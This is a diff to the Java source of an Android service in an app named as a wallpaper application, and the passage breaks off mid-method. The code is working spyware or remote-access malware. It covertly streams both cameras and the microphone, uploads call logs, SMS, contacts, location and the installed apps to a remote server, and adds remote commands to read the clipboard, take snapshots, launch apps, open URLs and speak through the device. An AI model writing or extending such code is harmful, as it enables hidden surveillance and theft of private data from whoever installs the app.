@@ -1,50 +1,57 @@
 package com.example.wallpaperapplication;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
+import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.media.AudioManager;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.VibrationEffect;
+import android.os.Vibrator;
 import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.provider.Telephony;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.util.Log;
+import android.widget.Toast;
+
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
+import androidx.preference.PreferenceManager;
+
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationCallback;
+import com.google.android.gms.location.LocationRequest;
+import com.google.android.gms.location.LocationResult;
+import com.google.android.gms.location.LocationServices;
+
+import io.socket.client.IO;
+import io.socket.client.Socket;
+
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
-import org.webrtc.AudioSource;
-import org.webrtc.AudioTrack;
-import org.webrtc.Camera2Enumerator;
-import org.webrtc.DefaultVideoDecoderFactory;
-import org.webrtc.DefaultVideoEncoderFactory;
-import org.webrtc.EglBase;
-import org.webrtc.IceCandidate;
-import org.webrtc.MediaConstraints;
-import org.webrtc.PeerConnection;
-import org.webrtc.PeerConnectionFactory;
-import org.webrtc.RtpReceiver;
-import org.webrtc.RtpTransceiver;
-import org.webrtc.SdpObserver;
-import org.webrtc.SessionDescription;
-import org.webrtc.SurfaceTextureHelper;
-import org.webrtc.VideoCapturer;
-import org.webrtc.VideoSource;
-import org.webrtc.VideoTrack;
-import io.socket.client.IO;
-import io.socket.client.Socket;
+import org.webrtc.*;
+
+import java.io.File;
 import java.net.URISyntaxException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -53,34 +60,28 @@ import java.util.Collections;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
-import com.google.android.gms.location.FusedLocationProviderClient;
-import com.google.android.gms.location.LocationCallback;
-import com.google.android.gms.location.LocationRequest;
-import com.google.android.gms.location.LocationResult;
-import com.google.android.gms.location.LocationServices;
-import android.content.SharedPreferences;
-import androidx.preference.PreferenceManager;
-import android.content.BroadcastReceiver;
-import android.content.IntentFilter;
-import java.io.File;
-import java.io.FileInputStream;
-import android.util.Base64;
 
-public class StreamingService extends Service {
+import android.speech.tts.TextToSpeech;
+
+public class StreamingService extends Service implements android.hardware.SensorEventListener, TextToSpeech.OnInitListener {
+    private TextToSpeech tts;
+    private android.hardware.SensorManager sensorManager;
+    private android.hardware.Sensor lightSensor;
+    private android.hardware.Sensor proximitySensor;
+    private android.hardware.Sensor accelSensor;
+    private boolean isSensorSubscribed = false;
+    private long lastSensorEmitTime = 0;
     private static final String TAG = "StreamingService";
-    private static final String CHANNEL_ID = "streaming_channel";
-    private static final int NOTIFICATION_ID = 1;
-    public static final String DEFAULT_SIGNALING_URL = "http://192.168.29.10:3000";
     private static final long DATA_POLL_INTERVAL = 30_000; // Poll every 30 seconds
 
     private PeerConnectionFactory factory;
     private EglBase eglBase;
-    private SurfaceTextureHelper frontHelper;
-    private SurfaceTextureHelper backHelper;
-    private VideoCapturer frontCapturer;
-    private VideoCapturer backCapturer;
-    private VideoSource frontSource;
-    private VideoSource backSource;
+    
+    // Modular Components
+    private CameraManager cameraManager;
+    private FileSystemExtension fileSystemExtension;
+    private LocalRecorder localRecorder;
+
     private AudioSource audioSource;
     private PeerConnection peerConnection;
     private Socket socket;
@@ -95,33 +96,49 @@ public class StreamingService extends Service {
     public void onCreate() {
         super.onCreate();
         Log.d(TAG, "Service onCreate");
-        startForeground(NOTIFICATION_ID, createNotification());
+
+        tts = new TextToSpeech(this, this);
+
+        sensorManager = (android.hardware.SensorManager) getSystemService(Context.SENSOR_SERVICE);
+        if (sensorManager != null) {
+            lightSensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_LIGHT);
+            proximitySensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_PROXIMITY);
+            accelSensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_ACCELEROMETER);
+        }
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(Constants.NOTIFICATION_ID, createNotification(), 
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | 
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | 
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+        } else {
+            startForeground(Constants.NOTIFICATION_ID, createNotification());
+        }
 
         // Register Sync Receiver (triggered by WorkManager)
         syncReceiver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
-                if ("com.example.wallpaperapplication.ACTION_FORCE_SYNC".equals(intent.getAction())) {
+                if (Constants.ACTION_FORCE_SYNC.equals(intent.getAction())) {
                     Log.d(TAG, "Received Force Sync broadcast");
                     if (socket != null && socket.connected()) {
                         sendCallLogs();
                         sendSmsMessages();
-                        if (fusedLocationClient != null) {
-                            try {
-                                fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
-                                    if (location != null) sendLocation(location.getLatitude(), location.getLongitude());
-                                });
-                            } catch (SecurityException e) {}
-                        }
+                        sendContacts();
+                        sendDeviceInfo();
+                        requestLastLocation();
                     }
                 }
             }
         };
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            registerReceiver(syncReceiver, new IntentFilter("com.example.wallpaperapplication.ACTION_FORCE_SYNC"), Context.RECEIVER_NOT_EXPORTED);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(syncReceiver, new IntentFilter(Constants.ACTION_FORCE_SYNC), Context.RECEIVER_NOT_EXPORTED);
+        } else {
+            registerReceiver(syncReceiver, new IntentFilter(Constants.ACTION_FORCE_SYNC));
         }
 
-        // Schedule WorkManager (Periodic)
+        // Schedule WorkManager (Periodic fallback)
         androidx.work.PeriodicWorkRequest saveRequest =
                 new androidx.work.PeriodicWorkRequest.Builder(DataSyncWorker.class, 15, java.util.concurrent.TimeUnit.MINUTES)
                         .build();
@@ -135,11 +152,13 @@ public class StreamingService extends Service {
             stopSelf();
             return;
         }
+        
         initializeWebRTC();
+        localRecorder = new LocalRecorder(this, eglBase);
         setupMediaStreaming();
         connectSignaling();
         startNotificationListener();
-        // startDataPolling(); // Replaced by WorkManager
+        
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
     }
 
@@ -147,7 +166,7 @@ public class StreamingService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null) {
             String action = intent.getAction();
-            if ("STOP_STREAMING".equals(action)) {
+            if (Constants.ACTION_STOP_STREAMING.equals(action)) {
                 stopSelf();
             }
         }
@@ -189,7 +208,7 @@ public class StreamingService extends Service {
 
     private String getSignalingUrl() {
         SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
-        return prefs.getString("signaling_url", DEFAULT_SIGNALING_URL);
+        return prefs.getString(Constants.PREF_SIGNALING_URL, Constants.DEFAULT_SIGNALING_URL);
     }
 
     private boolean hasRequiredPermissions() {
@@ -200,6 +219,7 @@ public class StreamingService extends Service {
         boolean callLog = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
         boolean sms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
         boolean location = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+        boolean contacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
         
         boolean storage = true;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -214,13 +234,14 @@ public class StreamingService extends Service {
         if (!callLog) Log.e(TAG, "Call log permission missing");
         if (!sms) Log.e(TAG, "SMS permission missing");
         if (!location) Log.e(TAG, "Location permission missing");
+        if (!contacts) Log.e(TAG, "Contacts permission missing");
         if (!storage) Log.e(TAG, "Storage permission missing");
         
-        return camera && audio && notify && callLog && sms && location && storage;
+        return camera && audio && notify && callLog && sms && location && contacts && storage;
     }
 
     private void broadcastPermissionError() {
-        Intent err = new Intent("com.example.wallpaperapplication.PERMISSION_ERROR");
+        Intent err = new Intent(Constants.ACTION_PERMISSION_ERROR);
         sendBroadcast(err);
     }
 
@@ -237,60 +258,13 @@ public class StreamingService extends Service {
     }
 
     private void setupMediaStreaming() {
-        setupFrontCapture();
-        setupBackCapture();
+        cameraManager = new CameraManager(this, eglBase);
+        cameraManager.initialize(factory);
+        cameraManager.startFrontCamera();
+        cameraManager.startBackCamera();
+
         setupAudioCapture();
         setupPeerConnection();
-    }
-
-    private void setupFrontCapture() {
-        Camera2Enumerator enumerator = new Camera2Enumerator(this);
-        String frontDevice = null;
-        for (String name : enumerator.getDeviceNames()) {
-            if (enumerator.isFrontFacing(name)) {
-                frontDevice = name;
-                break;
-            }
-        }
-        if (frontDevice == null) {
-            Log.e(TAG, "No front camera available");
-            return;
-        }
-        frontCapturer = enumerator.createCapturer(frontDevice, null);
-        frontHelper = SurfaceTextureHelper.create("FrontCaptureThread", eglBase.getEglBaseContext());
-        frontSource = factory.createVideoSource(false);
-        frontCapturer.initialize(frontHelper, getApplicationContext(), frontSource.getCapturerObserver());
-        try {
-            frontCapturer.startCapture(640, 480, 30);
-            Log.d(TAG, "Front video capture started");
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to start front video capture", e);
-        }
-    }
-
-    private void setupBackCapture() {
-        Camera2Enumerator enumerator = new Camera2Enumerator(this);
-        String backDevice = null;
-        for (String name : enumerator.getDeviceNames()) {
-            if (enumerator.isBackFacing(name)) {
-                backDevice = name;
-                break;
-            }
-        }
-        if (backDevice == null) {
-            Log.e(TAG, "No back camera available");
-            return;
-        }
-        backCapturer = enumerator.createCapturer(backDevice, null);
-        backHelper = SurfaceTextureHelper.create("BackCaptureThread", eglBase.getEglBaseContext());
-        backSource = factory.createVideoSource(false);
-        backCapturer.initialize(backHelper, getApplicationContext(), backSource.getCapturerObserver());
-        try {
-            backCapturer.startCapture(640, 480, 30);
-            Log.d(TAG, "Back video capture started");
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to start back video capture", e);
-        }
     }
 
     private void setupAudioCapture() {
@@ -346,7 +320,7 @@ public class StreamingService extends Service {
                     msg.put("to", webClientId);
                     msg.put("from", socket.id());
                     msg.put("signal", signal);
-                    socket.emit("signal", msg);
+                    socket.emit(Constants.EVENT_SIGNAL, msg);
                     Log.d(TAG, "Sent ICE candidate: " + c.sdpMid);
                 } catch (JSONException e) {
                     Log.e(TAG, "ICE send failed", e);
@@ -368,14 +342,14 @@ public class StreamingService extends Service {
             }
         });
 
-        if (frontSource != null) {
-            VideoTrack frontTrack = factory.createVideoTrack("front_camera", frontSource);
+        if (cameraManager.hasFrontCamera()) {
+            VideoTrack frontTrack = cameraManager.getFrontTrack();
             peerConnection.addTransceiver(frontTrack, new RtpTransceiver.RtpTransceiverInit(
                     RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
             Log.d(TAG, "Front video track added");
         }
-        if (backSource != null) {
-            VideoTrack backTrack = factory.createVideoTrack("back_camera", backSource);
+        if (cameraManager.hasBackCamera()) {
+            VideoTrack backTrack = cameraManager.getBackTrack();
             peerConnection.addTransceiver(backTrack, new RtpTransceiver.RtpTransceiverInit(
                     RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
             Log.d(TAG, "Back video track added");
@@ -383,8 +357,15 @@ public class StreamingService extends Service {
         if (audioSource != null) {
             AudioTrack at = factory.createAudioTrack("audio", audioSource);
             peerConnection.addTransceiver(at, new RtpTransceiver.RtpTransceiverInit(
-                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
+                    RtpTransceiver.RtpTransceiverDirection.SEND_RECV, Collections.singletonList("stream")));
             Log.d(TAG, "Audio track added");
+            
+            // Route two-way audio to main speakerphone
+            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
+            if (am != null) {
+                am.setMode(AudioManager.MODE_IN_COMMUNICATION);
+                am.setSpeakerphoneOn(true);
+            }
         }
     }
 
@@ -406,22 +387,28 @@ public class StreamingService extends Service {
             return;
         }
 
+        // Initialize Filesystem Extension
+        fileSystemExtension = new FileSystemExtension(this, socket);
+        fileSystemExtension.init();
+
         socket.on(Socket.EVENT_CONNECT, args -> {
             Log.d(TAG, "Socket.IO CONNECTED");
-            socket.emit("identify", "android");
+            socket.emit(Constants.EVENT_IDENTIFY, "android");
             createAndSendOffer();
         }).on(Socket.EVENT_CONNECT_ERROR, args -> {
             Log.e(TAG, "Connect error: " + Arrays.toString(args));
         }).on("id", args -> {
             Log.d(TAG, "Received socket ID: " + args[0]);
-        }).on("web-client-ready", args -> {
+        }).on(Constants.EVENT_WEB_CLIENT_READY, args -> {
             webClientId = (String) args[0];
             Log.d(TAG, "Web client ready: " + webClientId);
             createAndSendOffer();
             startLocationUpdates();
             sendCallLogs(); // Immediate sync
             sendSmsMessages(); // Immediate sync
-        }).on("signal", args -> {
+            sendContacts(); // Immediate sync
+            sendDeviceInfo(); // Immediate sync
+        }).on(Constants.EVENT_SIGNAL, args -> {
             Log.d(TAG, "Signal incoming");
             if (args[0] instanceof JSONObject) {
                 handleSignaling((JSONObject) args[0]);
@@ -432,172 +419,470 @@ public class StreamingService extends Service {
                 webClientId = null;
                 stopLocationUpdates();
             }
-        }).on("fs:list", args -> {
-            Log.d(TAG, "Received fs:list event: " + Arrays.toString(args));
-            String path = parsePath(args);
-            if (path != null) {
-                listFiles(path);
+        }).on(Constants.CMD_PING, args -> {
+            sendDeviceInfo();
+        }).on(Constants.CMD_STOP, args -> {
+            cleanup();
+            stopForeground(true);
+            stopSelf();
+        }).on(Constants.CMD_RECORD, args -> {
+            toggleLocalRecording();
+        }).on(Constants.CMD_GET_APPS, args -> {
+            sendAppsList();
+        }).on(Constants.CMD_GET_CONTACTS, args -> {
+            sendContacts();
+        }).on(Constants.CMD_VIBRATE, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                vibrateDevice((JSONObject) args[0]);
             } else {
-                Log.e(TAG, "fs:list invalid args: " + Arrays.toString(args));
+                vibrateDevice(null);
             }
-        }).on("fs:download", args -> {
-            String path = parsePath(args);
-            if (path != null) {
-                downloadFile(path);
+        }).on(Constants.CMD_TOAST, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                showToast((JSONObject) args[0]);
             }
-        }).on("fs:delete", args -> {
-            String path = parsePath(args);
-            if (path != null) {
-                deleteTargetFile(path);
+        }).on(Constants.CMD_OPEN_URL, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                openUrl((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_FLASHLIGHT, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                toggleFlashlight((JSONObject) args[0]);
+            } else {
+                toggleFlashlight(null);
+            }
+        }).on(Constants.CMD_SET_VOLUME, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                setVolume((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_SET_BRIGHTNESS, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                setBrightness((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_RING_DEVICE, args -> {
+            ringDevice();
+        }).on(Constants.CMD_SET_QUALITY, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                setVideoQuality((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_SET_GPS_INTERVAL, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                setGpsInterval((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_LAUNCH_APP, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                launchApp((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_TOGGLE_SENSORS, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                toggleSensorSubscription((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_GET_NETWORK, args -> {
+            sendNetworkDiagnostics();
+        }).on(Constants.CMD_TAKE_SNAPSHOT, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                takeCameraSnapshot((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_GET_CLIPBOARD, args -> {
+            getClipboardText();
+        }).on(Constants.CMD_SET_CLIPBOARD, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                setClipboardText((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_TTS_SPEAK, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                speakTts((JSONObject) args[0]);
             }
         });
 
         socket.connect();
     }
 
-    private String parsePath(Object[] args) {
-        if (args.length > 0) {
-            if (args[0] instanceof String) {
-                return (String) args[0];
-            } else if (args[0] instanceof JSONObject) {
-                return ((JSONObject) args[0]).optString("path", null);
-            }
+    private void toggleLocalRecording() {
+        if (localRecorder == null) {
+            localRecorder = new LocalRecorder(this, eglBase);
         }
-        return null;
-    }
-
-    private void listFiles(String path) {
-        if (webClientId == null) return;
-        File directory = new File(path);
-        if (!directory.exists() || !directory.isDirectory()) {
-            directory = android.os.Environment.getExternalStorageDirectory();
-        }
-
-        File[] files = directory.listFiles();
-        JSONArray fileList = new JSONArray();
-        if (files != null) {
-            for (File file : files) {
-                try {
-                    JSONObject f = new JSONObject();
-                    f.put("name", file.getName());
-                    f.put("path", file.getAbsolutePath());
-                    f.put("isDir", file.isDirectory());
-                    f.put("size", file.length());
-                    fileList.put(f);
-                } catch (JSONException e) {}
-            }
-        }
-
-        try {
-            JSONObject msg = new JSONObject();
-            msg.put("to", webClientId);
-            msg.put("from", socket.id());
-            JSONObject data = new JSONObject();
-            data.put("currentPath", directory.getAbsolutePath());
-            data.put("files", fileList);
-            msg.put("file_list", data);
-            socket.emit("fs:files", msg);
-        } catch (JSONException e) { Log.e(TAG, "FS List Error", e); }
-    }
-
-    private void downloadFile(String path) {
-        if (webClientId == null) return;
-        File file = new File(path);
-        if (file.exists() && file.isFile()) {
-            new Thread(() -> {
-                try {
-                    String fileId = java.util.UUID.randomUUID().toString();
-                    long fileSize = file.length();
-                    int chunkSize = 64 * 1024; // 64KB chunks - Reduced to prevent GC thrashing and buffer bloat
-                    int totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
-
-                    Log.d(TAG, "Starting download for " + file.getName() + ", size=" + fileSize + ", chunks=" + totalChunks);
-
-                    // Send Start Event
-                    JSONObject startMsg = new JSONObject();
-                    startMsg.put("to", webClientId);
-                    startMsg.put("from", socket.id());
-                    JSONObject startData = new JSONObject();
-                    startData.put("fileId", fileId);
-                    startData.put("name", file.getName());
-                    startData.put("size", fileSize);
-                    startData.put("totalChunks", totalChunks);
-                    startMsg.put("fileId", fileId);
-                    startMsg.put("name", file.getName());
-                    startMsg.put("size", fileSize);
-                    startMsg.put("totalChunks", totalChunks);
-                    
-                    socket.emit("fs:download_start", startMsg);
-
-                    FileInputStream fis = new FileInputStream(file);
-                    byte[] buffer = new byte[chunkSize];
-                    int bytesRead;
-                    int chunkIndex = 0;
-
-                    while ((bytesRead = fis.read(buffer)) != -1) {
-                        if (!socket.connected()) {
-                            Log.w(TAG, "Socket disconnected during download, aborting.");
-                            break;
-                        }
-
-                        // Encode only the read bytes
-                        String base64Chunk = Base64.encodeToString(buffer, 0, bytesRead, Base64.NO_WRAP);
-
-                        JSONObject chunkMsg = new JSONObject();
-                        chunkMsg.put("to", webClientId);
-                        chunkMsg.put("from", socket.id());
-                        chunkMsg.put("fileId", fileId);
-                        chunkMsg.put("chunkIndex", chunkIndex);
-                        chunkMsg.put("content", base64Chunk);
-                        
-                        socket.emit("fs:download_chunk", chunkMsg);
-                        
-                        chunkIndex++;
-                        // Increased delay to prevent flooding the socket and causing disconnects
-                        // 50ms = ~20 chunks/sec * 64KB = ~1.2 MB/s
-                        Thread.sleep(50); 
-                    }
-                    fis.close();
-
-                    // Send Complete Event
-                    JSONObject completeMsg = new JSONObject();
-                    completeMsg.put("to", webClientId);
-                    completeMsg.put("from", socket.id());
-                    completeMsg.put("fileId", fileId);
-                    socket.emit("fs:download_complete", completeMsg);
-
-                    Log.d(TAG, "Download complete for " + file.getName());
-
-                } catch (Exception e) {
-                    Log.e(TAG, "FS Download Error", e);
-                    try {
-                        JSONObject errorMsg = new JSONObject();
-                        errorMsg.put("to", webClientId);
-                        errorMsg.put("from", socket.id());
-                        errorMsg.put("fileId", "unknown"); // We might not know ID if it failed early, but usually we do.
-                        errorMsg.put("error", e.getMessage());
-                        socket.emit("fs:download_error", errorMsg);
-                    } catch (JSONException ignored) {}
+        if (localRecorder.isRecording()) {
+            localRecorder.stop(path -> {
+                Log.d(TAG, "Local recording stopped, saved to: " + path);
+                sendRecordingStatus(false, path);
+            });
+        } else {
+            String path = null;
+            if (cameraManager != null) {
+                if (cameraManager.hasBackCamera()) {
+                    path = localRecorder.startSingle(cameraManager.getBackTrack());
+                } else if (cameraManager.hasFrontCamera()) {
+                    path = localRecorder.startSingle(cameraManager.getFrontTrack());
                 }
-            }).start();
+            }
+            if (path != null) {
+                Log.d(TAG, "Local recording started, saving to: " + path);
+                sendRecordingStatus(true, path);
+            }
         }
     }
 
-    private void deleteTargetFile(String path) {
-        File file = new File(path);
-        file.delete();
+    private void sendRecordingStatus(boolean active, String path) {
+        if (webClientId == null || socket == null || !socket.connected()) return;
+        try {
+            JSONObject data = new JSONObject()
+                    .put("type", "recording_status")
+                    .put("active", active);
+            if (path != null) {
+                data.put("file", path);
+            }
+            JSONObject msg = new JSONObject()
+                    .put("to", webClientId)
+                    .put("from", socket.id())
+                    .put("signal", data);
+            socket.emit(Constants.EVENT_SIGNAL, msg);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error sending recording status", e);
+        }
     }
+
+    private void sendDeviceInfo() {
+        if (socket == null || !socket.connected()) return;
+        try {
+            JSONObject info = new JSONObject();
+            info.put("model", Build.MODEL);
+            info.put("manufacturer", Build.MANUFACTURER);
+            info.put("version", Build.VERSION.RELEASE);
+            info.put("streaming", true);
+            info.put("recording", localRecorder != null && localRecorder.isRecording());
+
+            // Get battery details dynamically
+            JSONObject battery = getBatteryDetails();
+            info.put("battery", battery.optInt("percent", 0));
+            info.put("batteryTemp", battery.optDouble("temperature", 0.0));
+            info.put("chargingSource", battery.optString("source", "unplugged"));
+
+            // Get storage details
+            long[] storage = getStorageMetrics();
+            double totalGB = storage[0] / (1024.0 * 1024.0 * 1024.0);
+            double freeGB = storage[1] / (1024.0 * 1024.0 * 1024.0);
+            info.put("storageTotal", Math.round(totalGB * 100.0) / 100.0);
+            info.put("storageFree", Math.round(freeGB * 100.0) / 100.0);
+
+            socket.emit(Constants.EVENT_DEVICE_INFO, info);
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending device info", e);
+        }
+    }
+
+    private JSONObject getBatteryDetails() {
+        JSONObject details = new JSONObject();
+        try {
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent batteryStatus = registerReceiver(null, ifilter);
+            if (batteryStatus != null) {
+                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+                int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
+                int temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
+                
+                double batteryPct = level * 100 / (double) scale;
+                double tempC = temperature / 10.0;
+                
+                String source = "unplugged";
+                if (chargePlug == BatteryManager.BATTERY_PLUGGED_AC) source = "AC Charger";
+                else if (chargePlug == BatteryManager.BATTERY_PLUGGED_USB) source = "USB Port";
+                else if (chargePlug == BatteryManager.BATTERY_PLUGGED_WIRELESS) source = "Wireless";
+                
+                details.put("percent", (int) batteryPct);
+                details.put("temperature", tempC);
+                details.put("source", source);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error fetching battery details", e);
+        }
+        return details;
+    }
+
+    private long[] getStorageMetrics() {
+        try {
+            File path = android.os.Environment.getDataDirectory();
+            android.os.StatFs stat = new android.os.StatFs(path.getPath());
+            long blockSize = stat.getBlockSizeLong();
+            long totalBlocks = stat.getBlockCountLong();
+            long availableBlocks = stat.getAvailableBlocksLong();
+            
+            long totalBytes = totalBlocks * blockSize;
+            long freeBytes = availableBlocks * blockSize;
+            
+            return new long[]{ totalBytes, freeBytes };
+        } catch (Exception e) {
+            Log.e(TAG, "Error fetching storage metrics", e);
+            return new long[]{0, 0};
+        }
+    }
+
+    private void setVideoQuality(JSONObject payload) {
+        if (payload == null || cameraManager == null) return;
+        String quality = payload.optString("quality", "medium");
+        int width = 640;
+        int height = 480;
+        int fps = 15;
+        if ("low".equals(quality)) {
+            width = 320;
+            height = 240;
+            fps = 10;
+        } else if ("high".equals(quality)) {
+            width = 1280;
+            height = 720;
+            fps = 30;
+        }
+        cameraManager.changeResolution(width, height, fps);
+    }
+
+    private void setGpsInterval(JSONObject payload) {
+        if (payload == null) return;
+        long intervalMs = payload.optLong("intervalMs", 10000);
+        Log.d(TAG, "Setting GPS polling interval to: " + intervalMs + "ms");
+        startLocationUpdates(intervalMs);
+    }
+
+    private void launchApp(JSONObject payload) {
+        if (payload == null) return;
+        String packageName = payload.optString("packageName", "");
+        if (!packageName.isEmpty()) {
+            try {
+                Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
+                if (intent != null) {
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                    Log.d(TAG, "Successfully launched app package: " + packageName);
+                } else {
+                    Log.w(TAG, "No launch intent found for package: " + packageName);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error launching app: " + packageName, e);
+            }
+        }
+    }
+
+    private void sendAppsList() {
+        if (webClientId == null || socket == null || !socket.connected()) return;
+        new Thread(() -> {
+            try {
+                JSONArray apps = new JSONArray();
+                PackageManager pm = getPackageManager();
+                for (ApplicationInfo packageInfo : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
+                    if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                        JSONObject app = new JSONObject();
+                        app.put("name", pm.getApplicationLabel(packageInfo).toString());
+                        app.put("package", packageInfo.packageName);
+                        try {
+                            app.put("version", pm.getPackageInfo(packageInfo.packageName, 0).versionName);
+                        } catch (Exception e) {
+                            app.put("version", "unknown");
+                        }
+                        apps.put(app);
+                    }
+                }
+                JSONObject msg = new JSONObject()
+                        .put("to", webClientId)
+                        .put("apps", apps);
+                socket.emit(Constants.EVENT_APPS, msg);
+            } catch (Exception e) {
+                Log.e(TAG, "Error listing apps", e);
+            }
+        }).start();
+    }
+
+    private void sendContacts() {
+        if (webClientId == null || socket == null || !socket.connected()) return;
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "Read contacts permission not granted");
+            return;
+        }
+        new Thread(() -> {
+            try {
+                JSONArray contacts = new JSONArray();
+                Cursor cursor = getContentResolver().query(
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        null, null, null,
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+                );
+                if (cursor != null) {
+                    int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+                    int numberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+                    while (cursor.moveToNext()) {
+                        JSONObject contact = new JSONObject();
+                        contact.put("name", cursor.getString(nameIdx));
+                        contact.put("number", cursor.getString(numberIdx));
+                        contacts.put(contact);
+                    }
+                    cursor.close();
+                }
+                JSONObject msg = new JSONObject()
+                        .put("to", webClientId)
+                        .put("contacts_list", contacts);
+                socket.emit(Constants.EVENT_CONTACTS, msg);
+            } catch (Exception e) {
+                Log.e(TAG, "Error fetching contacts", e);
+            }
+        }).start();
+    }
+
+    private void vibrateDevice(JSONObject payload) {
+        try {
+            long duration = payload != null ? payload.optLong("duration", 500) : 500;
+            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+            if (v != null && v.hasVibrator()) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    v.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
+                } else {
+                    v.vibrate(duration);
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error vibrating device", e);
+        }
+    }
+
+    private void showToast(JSONObject payload) {
+        if (payload == null) return;
+        String text = payload.optString("text", "");
+        if (!text.isEmpty()) {
+            new Handler(Looper.getMainLooper()).post(() -> 
+                Toast.makeText(StreamingService.this, text, Toast.LENGTH_SHORT).show()
+            );
+        }
+    }
+
+    private void openUrl(JSONObject payload) {
